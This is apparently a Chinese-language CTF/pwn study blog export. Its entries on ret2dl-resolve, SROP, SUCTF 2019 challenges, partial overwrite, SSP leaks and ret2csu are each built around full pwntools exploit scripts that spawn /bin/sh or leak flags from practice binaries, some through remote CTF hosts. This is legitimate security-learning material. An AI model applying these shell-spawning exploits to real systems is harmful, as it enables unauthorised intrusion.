(base_stage+28)的位置payload2 += &apos;B&apos; * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += &quot;write\x00&quot;payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += cmd payload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive() Part 6把write改成system来getshell 123456789101112131415161718192021222324252627282930313233cmd = &quot;/bin/sh\x00&quot;plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got[&apos;write&apos;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = &apos;AAAA&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;AAAA&apos;payload2 += p32(base_stage + 80)payload2 += &apos;aaaa&apos;payload2 += &apos;aaaa&apos;payload2 += fake_reloc # (base_stage+28)的位置payload2 += &apos;B&apos; * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += &quot;system\x00&quot;payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += cmdpayload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive() 就可以成功getshell了！！！ 完整exp python123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# -*- coding: utf-8 -*-from pwn import *p = process(&apos;./bof&apos;)elf = ELF(&apos;./bof&apos;)rel_plt = 0x08048330plt_0 = 0x08048380dynsym = 0x080481d8dynstr = 0x08048278leave_ret = 0x08048458pop_ebp = 0x0804861b ppp_ret = 0x08048619 #pop esi ; pop edi ; pop ebp ; retbss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;stack_size = 0x800base_stage = bss_addr + stack_sizeread_plt = elf.plt[&apos;read&apos;]write_plt = elf.plt[&apos;write&apos;]write_got = elf.got[&apos;write&apos;]fake_sym_addr = base_stage + 36 align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10 r_info = index_dynsym &lt;&lt; 8 | 0x7fake_reloc = p32(write_got) + p32(r_info) st_name = fake_sym_addr + 0x10 - dynstrfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)index_offset = (base_stage + 28) - rel_plt#stage 1 bss_addrpayload = &quot;a&quot;*112 payload += p32(read_plt) # 读100个字节到base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp) # 把base_stage pop到ebp中payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stagep.sendline(payload)#stage 2 system(&apos;/bin/sh&apos;)payload2 = &apos;AAAA&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;AAAA&apos;payload2 += p32(base_stage + 80)payload2 += &apos;AAAA&apos;payload2 += &apos;AAAA&apos;payload2 += fake_reloc # stack_addr+28payload2 += &apos;A&apos; * alignpayload2 += fake_sym # stack_addr+36+alignpayload2 += &quot;system\x00&quot;payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += &quot;/bin/sh\x00&quot;payload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive()]]></content>
      <tags>
        <tag>pwn知识点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[srop]]></title>
    <url>%2F2019%2F09%2F02%2Fsrop%2F</url>
    <content type="text"><![CDATA[SropSrop大概是一种，没有其他函数，找gadget会比较麻烦，无法利用来leak地址，借助signal handle机制’sigreturn’的系统调用，更改signal frame（这是一段代码）的一些寄存器的值做到系统调用，主要相关的寄存器有：rax（系统调用号）、rdi（存参）、rip（下一条指令）、rsp（栈顶），还有就是re_sigreturn（存sigreturn的系统调用号，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15） 偷偷搬运一下wiki里的图，这就是一个signal frame，最后执行完sigreturn之后会执行execve（‘/bin/sh’,0,0） 这里懂了，大概的原理就懂了一点了（其实我很懵）然后看到了我们的smallest 整个程序只有start函数，没办法调用write和puts这些来leak stack_addr，这就要用到我们的srop了。 首先看懂我们的程序到底在干啥，貌似是在执行read函数，但是我们在gdb里跑一遍是可以发现我们下一步是没有操作了的。然后我们知道read和write函数只是第一个参数不一样，那我们就改一下rax的值，看到有xor 操作就知道它置零了rax，我们要做的就是绕过那一步 那我们先让程序到start最开始的地方，即0x4000b0的地方，然后直接更改低位地址为b3，绕过置零的步骤，就成功调用write了，在leak之后我们还要返回这个程序，所以要再填入一个0x4000b0所以第一步我们发送三个起始地址实现leak 1payload = p64(start_addr) * 3 在实现leak之后就要想办法把execve（‘/bin/sh’,0,0）写入栈里，最后再实现调用 然后我们知道rax这个寄存器非常特殊，它除了被用来指定系统调用的调用号之外，也是函数返回值最后存放的地方。因此，我们可以利用控制函数返回值来控制rax寄存器的值。（其实我不知道的，所以看大佬wp的时候还一脸懵，不知道为啥非要填15个字符，想着又不是格式化字符串，看来还是我太菜了）然后我们将rax寄存器设置成15（sigreturn的系统调用号），然后调用一个syscall，这个效果就和调用一个sigreturn是一样一样的（所以在额外我们再次写入了syscall） 所以第二步是利用sigreturn构造read的frame，第三步是往栈里写入execve（‘/bin/sh’,0,0） 1234567891011121314151617181920212223242526272829sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_retpayload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)#把frame写入栈中sh.send(payload)## set rax=15 and call sigreturnsigreturn = p64(syscall_ret) + &apos;b&apos; * 7sh.send(sigreturn)## call execv(&quot;/bin/sh&quot;,0,0)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr + 0x150 # &quot;/bin/sh&quot; &apos;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retframe_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe) print len(frame_payload)payload = frame_payload + (0x150 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;sh.send(payload)sh.send(sigreturn) 完整的exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *from LibcSearcher import *small = ELF(&apos;./smallest&apos;)if args[&apos;REMOTE&apos;]: sh = remote(&apos;127.0.0.1&apos;, 7777)else: sh = process(&apos;./smallest&apos;)context.arch = &apos;amd64&apos;context.log_level = &apos;debug&apos;syscall_ret = 0x00000000004000BEstart_addr = 0x00000000004000B0## set start addr three times# gdb.attach(sh)payload = p64(start_addr) * 3sh.send(payload)gdb.attach(sh)## modify the return addr to start_addr+3## so that skip the xor rax,rax; then the rax=1## get stack addrsh.send(&apos;\xb3&apos;)stack_addr = u64(sh.recv()[8:16])log.success(&apos;leak stack addr :&apos; + hex(stack_addr))## make the rsp point to stack_addr## the frame is read(0,stack_addr,0x400)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_retpayload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)sh.send(payload)## set rax=15 and call sigreturnsigreturn = p64(syscall_ret) + &apos;b&apos; * 7sh.send(sigreturn)## call execv(&quot;/bin/sh&quot;,0,0)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr + 0x150 # &quot;/bin/sh&quot; &apos;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retframe_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)print len(frame_payload)payload = frame_payload + (0x150 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;sh.send(payload)sh.send(sigreturn)sh.interactive() 放一张23R3F大佬的理解过程图，写得很明了了（不过关于p64(0)的地方为什么会变成syscall那长度为0xf的东西，我真的没理解到，感觉那个东西只是作为返回值，然后长度传给了rax，然后我一直以为p64（0）只是为了让frame如从上上图的结构，看来还得继续学习理解啊） 感觉srop就粗略的通过这题过了一下子，很多关于机制和寄存器的原理还是有点懵，底层知识还不扎实，要好好补补了 相关参考链接:https://www.freebuf.com/articles/network/87447.html srop的原理https://www.jianshu.com/p/b838a10b63c7 23R3F师傅的wp]]></content>
      <tags>
        <tag>pwn知识点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[suctf的两三题wp]]></title>
    <url>%2F2019%2F08%2F20%2Fplayfmt%2F</url>
    <content type="text"><![CDATA[这次suctf我参与了的好像就三道题吧，还是和队友以及大佬商讨之后才弄出来的，发现自己真的太菜了 以下附上超级简单题的一些思路，当做给自己的记录吧 MT - crpyto这是个密码题，但是我re基础有点太弱了，纯靠逆估计得逆很久，那就选择爆破吧 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;unsigned int convert(unsigned int m) &#123; m = m ^ m &gt;&gt; 13; m = m ^ m &lt;&lt; 9 &amp; 2029229568ll; m = m ^ m &lt;&lt; 17 &amp; 2245263360ll; m = m ^ m &gt;&gt; 19; return m;&#125;int main() &#123; unsigned int i; for (i = 0; i &lt;= (unsigned int)0xffffffffll; i++) &#123; if (i &amp; 0xfffff == 0) printf(&quot;%u\n&quot;, i); if (convert(i) == (unsigned int)1679057065ll) &#123; printf(&quot;%u&quot;, i); break; &#125; &#125; return 0;&#125;//1679057065 2226413449//3818208026 2938293886//2854351778 1730632668 我们发现这道题就是把给的最终结果的flag切片，四个四个以字符的形式（两个十六进制数为一个）一循环，往函数里进行异或和位移操作 写python脚本的时候，崩溃了，跑不出来（能读的位太小？还是我python不熟啊？）换个c发现巨方便 falg : 84B45F89AF22CE7E67275BDC大写发现过不去，改成小写就可以了flag{84b45f89af22ce7e67275bdc} signup - re天知道第一道逆向竟然是rsa（看见熟悉的65537就知道了）把n丢到网站上分出两个质数然后直接丢给解rsa的脚本跑一下就出flag了（脚本来自超级可爱的队友，这里就不po出来了） flag是suctf{Pwn_@_hundred_years} Playfmt - pwn这道题，格式化字符串 看到这里觉得有些眼熟，这不是lab9的那个差不多吗，关键函数，漏洞位置都一样，然后我天真的以为可以套着lab9的方法做这道题，结果…我确实天真，写完脚本，疯狂get不到shell，发现地址没爆错啊，啥都没问题，那肯定是got表改不了的问题了，这个具体看程序函数，貌似是那个this指针？（this+1是指向flag的） 看程序就知道，flag是被读进了堆里，堆的地址，我不会分析，就直接爆破吧 偏移为6的位置作为第一个ebp，指向下一个地址，而下一个又指向了再下一个地址。偏移分别为6 、14 、26，蓝色字体的地址为heap的地址，选择爆破的话，泄露那个应该都OK我们知道flag是被写进堆里的，我们就把heap的地址存入ebp指向的地址处，同时会被存进26个偏移的位置（方便读取数据） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;p = process(&apos;./playfmt&apos;)# p = remote(&apos;120.78.192.35&apos;,9999)elf = ELF(&apos;./playfmt&apos;)libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)printf_got = elf.got[&apos;printf&apos;]system_libc = libc.symbols[&apos;system&apos;] printf_libc = libc.symbols[&apos;printf&apos;] def read_addr(target_addr): index1 = 6 #偏移是6的地方作为第一个ebp index2 = 14 #偏移是14的地方作为ebp2 --&gt; ebp里存的是ebp2的地址 value_ls = map(ord, p32(target_addr)) low_byte = stack_addr &amp; 0xfffor i in range(4): #stack地址就为ebp2处的地址，不变，heap的地址存在ebp2里，ebp2会指向ebp3，所以地址同时写入ebp3中#我对这个的理解是：第一处的payload代表每个ebp里的字节存入单字节heap的地址 payload = &apos;%&#123;&#125;c%&#123;&#125;$hhn\n\x00&apos;.format(low_byte + i, index1) p.sendline(payload) p.recvline() payload = &apos;%&#123;&#125;c%&#123;&#125;$hhn\n\x00&apos;.format(value_ls[i], index2) p.sendline(payload) p.recvline() success(&apos;target &apos; + hex(target_addr)) payload = &apos;%26$p\n\x00&apos; #ebp2指向的地址处，只存放target_addr，可直接读取 p.sendline(payload) p.recvline() payload = &apos;%26$s\n\x00&apos; p.sendline(payload)p.recv()payload = &apos;.%14$p.%18$p.\x00&apos; #%19$p也可p.sendline(payload)p.recvuntil(&quot;.&quot;)stack_addr = int(p.recv(10),16)success(&apos;stack &apos; + hex(stack_addr))p.recvuntil(&quot;.&quot;)heap_addr = int(p.recv(9),16)success(&apos;stack &apos; + hex(stack_addr))success(&apos;heap &apos; + hex(heap_addr))for i in range(-0x1000, 0, 0x4): #这里就随意循环heap的地址，找到flag字符，然后打印出来即可 success(&apos;offset &apos; + hex(i)) read_addr(heap_addr + i) ret = p.recvline() if &apos;suctf&apos; in ret: print(ret) p.interactive()p.interactive() 然后找大佬问了一下怎么确定flag到底写在了哪里，发现是我自己c和数据结构没学好……果然逆向基础和代码基础还是很重要的（一句话，我太菜了） V5是new出来的一个堆，这里的传参为this指针，v8是flag读入的堆，这里是a2（*this+1） Ida里找各个值的地址啥的New出来的v3为this，地址为[heap]0x08810E30其实看这个就能知道flag写在了末尾一个半字节为a10的地方，没关系，我们接着调。 我们输入%1$p发现它跳到了一个地方 发现其实它还没输出东西，那我们就继续往下执行，到printf执行之后，打印出第一个偏移处的地址 然后ida里，可以看见就在printf下面，那我们就算this的位置偏移是多少（数出来是19）我们修改一下ebp的地址，使他指向堆的地址（上面有说到第26个偏移的地方指向堆的地址，我们就把它改到ebp），然后我们把ebp2里指向的堆地址改成this+1的地址 我们tel一下查看堆里的信息，发现其实this+1里存的是flag的地址（上面的flag是自己本机的）然后我们就可以通过%19$s输出真实地址再把它写入ebp2，然后再执行%19$s就可以了Po个exp（来自一位特别特别好的大佬） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;p = remote(&apos;120.78.192.35&apos;,9999)elf = ELF(&apos;./playfmt&apos;)p.recv()payload = &apos;%6$p&apos;p.sendline(payload)sleep(1)################## ebp&amp;retlog_ebp = int(p.recv(),16)#logo ebp 14$ 0xffffd048do_fmt_ebp = log_ebp - 0x20#do fmt ebp 6$ 0xffffd028do_fmt_return = log_ebp -0x1c#do_fmt return_to 7$log.info(&quot;log_ebp--&gt;p[%s]&quot;%hex(log_ebp))log.info(&quot;do_fmt_ebp1--&gt;p[%s]&quot;%hex(do_fmt_ebp))log.info(&quot;do_fmt_return--&gt;p[%s]&quot;%hex(do_fmt_return))#################3 this_addr,flag_addr_offpayload = &apos;%19$p&apos;p.sendline(payload)sleep(1)heap_addr=int(p.recv(),16)#0x8050e30flag_addr_off=heap_addr+4 #0x8050e34log.info(&apos;heap_addr--&gt;p[%s]&apos;%hex(heap_addr))log.info(&apos;flag_addr_off--&gt;p[%s]&apos;%hex(flag_addr_off))################# change this to *flag on stackheap_addr_part=heap_addr &amp; 0xFF#0e30log_ebp_part=log_ebp &amp; 0xFF#d048heap_addr_stack_part=(log_ebp+0x14)&amp;0xFF#D05clog.info(&apos;heap_addr_part--&gt;p[%s]&apos;%hex(heap_addr_part))log.info(&apos;log_ebp_part--&gt;p[%s]&apos;%hex(log_ebp_part))log.info(&apos;heap_addr_stack_part--&gt;p[%s]&apos;%hex(heap_addr_stack_part))payload=&apos;%&apos;+str(heap_addr_stack_part)+&apos;d%6$hhn&apos;p.sendline(payload)p.recv()payload=&apos;%&apos;+str(heap_addr_part+4)+&apos;d%14$hhn&apos;p.sendline(payload)p.recv()#gdb.attach(p)################# leak flag_addrpayload=&apos;%19$s\x00&apos;p.sendline(payload)flag_addr=u32(p.recv(4))#################payload=&apos;%&apos;+str(flag_addr&amp;0xFFFF)+&apos;d%14$hn&apos;p.sendline(payload)p.recvuntil(&apos;134515884&apos;) #%1$p的地址 0x8048CACp.sendline(&apos;%19$s\x00&apos;)p.interactive()` 我们前面不是可以知道那个flag到底是读在了a10的地方吗？那我们就直接改一个，把一个指向栈地址的改成指向堆地址的地址，就是偏移为6的那个地方啦，然后直接修改堆的低地址（18偏移的地方地址为a28,离flag的地方特别近，直接改低一个字节的地址就可以了，贼方便了） 1234567891011121314151617181920#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;# p = remote(&apos;120.78.192.35&apos;,9999)p = process(&apos;./playfmt&apos;)elf = ELF(&apos;./playfmt&apos;)p.recvuntil(&quot;=\n&quot;)p.sendlineafter(&quot;=\n&quot;,&quot;%6$p&quot;)s = p.recvuntil(&quot;\n&quot;)stack_addr = int(s.strip(),16)print hex(stack_addr)stack = stack_addr + 0x10p.sendline(&quot;%&quot; + str(stack&amp;0xff) + &quot;c%6$hhn&quot;)p.sendline(&quot;%16c%14$hhn&quot;)p.sendline(&quot;%18$s&quot;)p.interactive() 这道题真实的flag好像是suctf{P_rin_Tfo}]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[partial overwrite]]></title>
    <url>%2F2019%2F08%2F16%2Foverwrite%2F</url>
    <content type="text"><![CDATA[partial overwrite我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。（对于绕过PIE的操作我是没怎么接触过的）大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去 Babypie这是一道保护全开的题 看到主程序，发现有两处写入 Read函数的最大问题大概就是它不会给末尾加’\0’所以可以leak地址leak canary在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会。为了第二次溢出能控制返回地址, 我们选择 leak canary. 可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 （因为canary的低位是\x00截断符，先用\x01去覆盖这个低位，然后打印出来后面的7位，最后加上\x00即可）、 发现有个可以直接getshell的函数，直接可以调用我们用第一个输入点把canary爆出来，然后第二个调用可以直接getshell的函数 然后exp的话，因为开了PIE所以只能知道低三位的地址，第四位得靠爆（真的是随缘的那种） 123456789101112131415161718192021#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *while True: try: p = process(&apos;./babypie&apos;) p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1)) p.recvuntil(&quot;a&quot;*(0x30-0x8+1)) canary = &apos;\0&apos; + p.recvn(7) print &quot;canary:&quot; + hex(u64(canary)) p.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8) + canary + &apos;bbbbbbbb&apos; + &apos;\x3E\x0A&apos;) p.interactive() except EOFError: p.close() continue 爆破了n遍之后终于。。。 然后发现，直接覆盖低两位地址就好了嘛！（read和system的函数贼接近，前面都是一样的，真的是要哭了） 12345678910111213#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *p = process(&apos;./babypie&apos;)p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1))p.recvuntil(&quot;a&quot;*(0x30-0x8+1))canary = &apos;\0&apos; + p.recvn(7)print &quot;canary:&quot; + hex(u64(canary))payload = &apos;&apos;payload += &apos;a&apos;* 0x28 + canary + &apos;aaaaaaaa&apos; + &apos;\x3E&apos;p.send(payload)p.interactive() 效果长这样 gets这题没开pie，但它选择覆盖那里我还是挺懵的，就是两个真实地址，libc_start_main+192 和 _dl_init+139我们到底选择覆盖哪个呢？这就很茫然了Wiki上说的是：我们一般要覆盖字节的话，至少要覆盖 1 个半字节才能够获取跳到 onegadget。然而，程序中读取的时候是 gets读取的，也就意味着字符串的末尾肯定会存在\x00。而我们覆盖字节的时候必须覆盖整数倍个数，即至少会覆盖 3 个字节，而我们再来看看libc_start_main+240 的地址 0x7ffff7a2d830（我这里是800），如果覆盖 3 个字节，那么就是 0x7ffff700xxxx，已经小于了 libc 的基地址了，前面也没有刻意执行的代码位置。一般来说 libc_start_main 在 libc 中的偏移不会差的太多，那么显然我们如果覆盖 __libc_start_main+240 ，显然是不可能的。而 ld 的基地址呢？如果我们覆盖了栈上_dl_init+139，即为0x7ffff700xxxx。而观察上述的内存布局，我们可以发现libc位于 ld 的低地址方向，那么在随机化的时候，很有可能 libc 的第 3 个字节是为\x00 的。举个例子，目前两者之间的偏移为0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000那么如果 ld 被加载到了 0x7ffff73ca000，则显然 libc 的起始地址就是0x7ffff7000000。然后就理所当然选_dl_init了（我觉得可能是libc是程序开始的地方，离我们要覆盖到的地址有点远，所以选一个近一点的） 所以由上面调试的截图可以看出，我们输完0x18个字符下一个ret处就是libc的地址了，而init离它还有18个偏移(a8-18=90—&gt;8个字节为一个偏移） 然后我们找一个能用的onegadget我们写个payload看看可不可以跑（估计要跑个六七万次，太难了啊） 1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *common_gadget = 0x40059Bdef exp(): for i in range(0x100000): # if args[&apos;REMOTE&apos;]: # p = remote(ip, port) # else: # p = process(&apos;./gets&apos;) # # gdb.attach(p) p = process(&apos;./gets&apos;) try: payload = 0x18 * &apos;a&apos; + p64(common_gadget) for _ in range(2): payload += &apos;a&apos; * 0x28 + p64(common_gadget) payload += &apos;a&apos; * 0x28 + &apos;\x16\02&apos; p.sendline(payload) p.sendline(&apos;ls&apos;) data = p.recv() print data p.interactive() p.close() except Exception: p.close() continueif __name__ == &quot;__main__&quot;:exp() 之前偶然跑出来一次，然后再没跑出来了……先放个exp，改天再试试]]></content>
      <tags>
        <tag>pwn知识点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ssp操作]]></title>
    <url>%2F2019%2F08%2F16%2Fssp%2F</url>
    <content type="text"><![CDATA[用于开了canary的程序（无法正常爆破canary）就借助这种操作，打印出栈内的字符串就是通过栈溢出报错信息，泄漏出指定地址的方法： stack smashing detected:+argv[0]如果我们覆盖argv[0]，便会输出特定字符串 满足条件为1、开了canary2、Flag在程序内 看wiki里的花式栈溢出的时候看到的题（其实我很迷为啥把它放到花式栈溢出里，之后再细细研究吧） 关于stack smash 这个有点开拓我知识面了，对于canary我一直很迷，看到这里才知道canary操作起来是个啥样子的。Wiki原话： 在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行?__stack_chk_fail?函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。代码如下 123456void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (&quot;stack smashing detected&quot;);&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125; 所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在?__fortify_fail?函数中就会输出我们想要的信息 smashes所以我们要找argv[0]的地址，（因为我们要求的偏移就是argv[0] 距离读取的字符串的偏移） 程序名指向的地址为e159，但是dd98里存放的是指向程序名的地址，所以我们需要的地址为后者接着在输入的地方下个断点，找上一个rsp作为字符串开始的地址 然后我们就可以算偏移了 所以我们的偏移为0x218 看程序会发现在一个地方会有flag的输出 但是我们看不到flag是什么最无奈的是我们输入的内容会覆盖整个地址，所以我们没有办法直接读出我们只能去找另一处的flag地址，这就接触到里另一个新的知识点了： 1在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找（pwndbg的话就用search吧） 现在就可以写exp了 12345678910111213141516#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *# p = process(&apos;./smashes&apos;)p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)flag = 0x0400D20payload = &quot;a&quot;*0x218 + p64(flag)p.recvuntil(&apos;name? &apos;)p.sendline(payload)p.recvuntil(&apos;flag: &apos;)p.sendline(&apos;CTF&apos;)p.interactive() 这里很坑的就是我找flag是按照程序里给的格式找的，是CTF开头的，但是真正的flag是PCTF（0x600d20那个位置的0x50转字符就是P），所以它的地址得再往前拨一位 GUESS再来做道GUESS这题有三次的输入，我们可以通过三次输入实现我们的leak和读取flag，这题和上面那题的思路大概是一致的，都是读取栈上的字符串，而不需要getshell（上面那题是可以知道flag具体存在哪里了，这题需要libc找） 本题思路： 1.泄漏libc的基址2.泄漏environ的地址（也就是栈的地址）3.泄漏flag 三次泄漏都用到了上一题说的ssp，就是通过栈溢出报错信息，泄漏出指定地址的方法：stack smashing detected:+argv[0]如果我们覆盖argv[0]，便会输出特定字符串 对environ很迷的我看了一下23R3F大佬的wp，又发现了新的玩意儿(以下来自大佬博客https://www.jianshu.com/p/cc9d09a3f65f)： 12345在linux应用程序运行时，内存的最高端是环境/参数节（environment/arguments?section）用来存储系统环境变量的一份复制文件，进程在运行时可能需要。例如，运行中的进程，可以通过环境变量来访问路径、shell?名称、主机名等信息。该节是可写的，因此在格式串（format?string）和缓冲区溢出（buffer?overflow）攻击中都可以攻击该节。*environ指针指向栈地址(环境变量位置)，有时它也成为攻击的对象，泄露栈地址，篡改栈空间地址，进而劫持控制流。 好，我们按照刚刚那题的解题步骤，先找argv[0]和字符串开始的地方来计算偏移 算出偏移我们就可以按照思路来写exp了前面两个part如下： 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *p = process(&apos;./GUESS&apos;)elf = ELF(&apos;./GUESS&apos;)libc = ELF(&apos;./libc.so.6&apos;)puts_got = elf.got[&apos;puts&apos;]# open_flag = 0x400A9A# argv = 0x7fffffffdda8# rsi_addr = 0x7fffffffdc80# distance = 0x128payload = &quot;a&quot;*0x128 + p64(puts_got)p.sendline(payload) p.recvuntil(&apos;stack smashing detected ***: &apos;) puts_addr = u64(p.recvuntil(&apos; &apos;)[:-1]+&apos;\x00\x00&apos;) # puts_addr = u64(p.recvuntil(&apos; &apos;)[:-1]) print &quot;puts_addr:&quot;+hex(puts_addr)libc_base = puts_addr - libc.symbols[&apos;puts&apos;] environ_addr = libc_base + libc.symbols[&apos;_environ&apos;] print &quot;libc_base:&quot;+hex(libc_base) print &quot;environ:&quot;+hex(environ_addr)payload = &apos;a&apos;*0x128 + p64(environ_addr) p.sendline(payload) p.recvuntil(&apos;stack smashing detected ***: &apos;) stack_addr = u64(p.recvuntil(&apos; &apos;)[:-1]+&apos;\x00\x00&apos;) # stack_addr = u64(p.recvuntil(&apos; &apos;)[:-1]) print &quot;stack_addr:&quot;+hex(stack_addr) 然后我们要算出buf与environ的差值，使程序跳转到flag的位置 构造最后一步的payload 12payload = &apos;a&apos;*0x128 + p64(stack_addr-0x168)p.sendline(payload) 最后效果 其实还是挺迷的，以后碰到题可能还会懵，先记录着吧]]></content>
      <tags>
        <tag>pwn知识点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[libc_csu]]></title>
    <url>%2F2019%2F07%2F08%2Flibc-csu%2F</url>
    <content type="text"><![CDATA[_libc_csu1、Ret2csu 这是一个64位的题，开了NX，照常，进ida里瞄瞄它的大体结构是怎样的。Emmm真是一个异常简洁的main函数 我们发现它有个pwnme函数哦，那就点进去看一下 它里面说了ret2win 的第三个参数（rdx）必须为“0xdeadcafebabebeef”，异或出来是“/bin/cat”，先记住它。然后它还有一堆的赋值为0的语句，手欠点开来看，发现它把got表全置0了，那么我们就完全不用考虑got表。 然后我们会看到还有一个ret2win函数 看到system就知道我们的getshell的关键步骤就在这里了，最后就是要把地址指向ret2win这个函数的，所以下一步就是要去找gadget。 我们知道ret2win的第三个参数是与rdx有关的，但是我们找不到关于rdx的gadget，所以只能另辟他径。ret2csu这类题目貌似就是通过__libc_csu_init函数的操作（很多gadget的函数） 由函数体关系得知rbx=0rbp=1（rbp=rbx+1）r12：存调用函数的地址r13：函数的第一个参数r14：函数的第二个参数r15：函数的第三个参数（a3/rdx） 然后还有一个很严重的问题，有一个setvbuf函数，据大佬所说是会把rdx的值赋值为0xfffffff，然后无法调用ret2win，所以导致在call处程序出错，无法再执行下去（但是我是在是调不到setvbuf那个函数的地方，下断点也没找到那个赋值语句）然后只能选用一个程序的初始化用的函数地址， 就这两个函数的地址，用这两个函数写入r12里，躲过setvbuf，然后就可以getshell了。 rdx是由r15传值得到的，而刚好下面的一系列操作包括r15的，所以这些gadget可用，上面的函数有个跳转指令，为了使他不跳转，我们可以直接对rbx和rbp赋值，rbx为0，rbp为1。我们先pop这些寄存器，并且赋值，再进入mov，最后在call的地方调用ret2win，所以r12存的应该是ret2win的地址。理清得差不多了，就开始写exp了 12345678910111213141516171819202122232425from pwn import *sh = process('./ret2csu')#bss = 0x0601060start = 0x0400880#mov rdx, r15;mov rsi, r14;mov edi, r13d;call qword ptr [r12+rbx*8]end = 0x0400896#add rsp, 8;pop rbx;pop rbp;pop r12/r13/r14/r15init = 0x0600E10win = 0x04007B1payload = "a"*0x20+p64(0)payload += p64(end)payload += p64(0)payload += p64(0)#rbxpayload += p64(1)#rbppayload += p64(init)#r12payload += p64(0)#r13payload += p64(0)#r14payload += p64(0xdeadcafebabebeef)#r15(rdx)payload += p64(start)payload += "a"*56payload += p64(win)sh.sendline(payload)sh.interactive() 运行之后就拿到flag了 level5Ida里打开main函数 